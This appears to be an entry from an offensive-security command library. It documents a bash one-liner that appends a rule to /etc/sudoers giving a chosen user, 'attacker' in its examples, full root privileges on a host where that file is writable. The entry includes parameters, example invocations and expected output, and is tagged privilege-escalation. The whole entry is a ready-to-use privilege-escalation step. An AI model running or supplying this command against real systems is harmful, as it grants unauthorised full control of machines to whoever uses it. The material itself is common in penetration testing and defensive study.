---
id: d2a98965-4601-4996-9597-1ecfde65cc0c
name: add-sudo-permissions-for-user
type: command
executor: bash
data: 'echo "$_USERNAME ALL=(ALL:ALL) ALL" >> /etc/sudoers'
output: null
created_at: '2023-04-06T03:56:19.284495+00:00'
updated_at: '2023-04-10T20:34:29.642335+00:00'
platforms:
  - Linux
tags:
  - privilege-escalation
  - sudoers
verified: true
validated: true
---

# add-sudo-permissions-for-user

## Command

```bash
echo "$_USERNAME ALL=(ALL:ALL) ALL" >> /etc/sudoers
```

## Description

This command appends a line to /etc/sudoers granting a specified user full sudo access to all commands on all hosts. Use this in privilege escalation scenarios where /etc/sudoers is writable.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_USERNAME | The target username to grant sudo permissions to | Yes |

## Examples

### Basic Usage

```bash
echo "attacker ALL=(ALL:ALL) ALL" >> /etc/sudoers
```

### Advanced Usage

Combine with verification:

```bash
echo "attacker ALL=(ALL:ALL) ALL" >> /etc/sudoers && tail /etc/sudoers
```

## Expected Output

The command produces no stdout output on success (silent append). Verify by checking the file:

```
$ tail /etc/sudoers
... (other lines)
attacker ALL=(ALL:ALL) ALL
```

If the file was not writable, it will error with 'Permission denied'.

## Related

- [[procedures/Linux-Privilege-Escalation-via-Writable-etc-sudoers]]
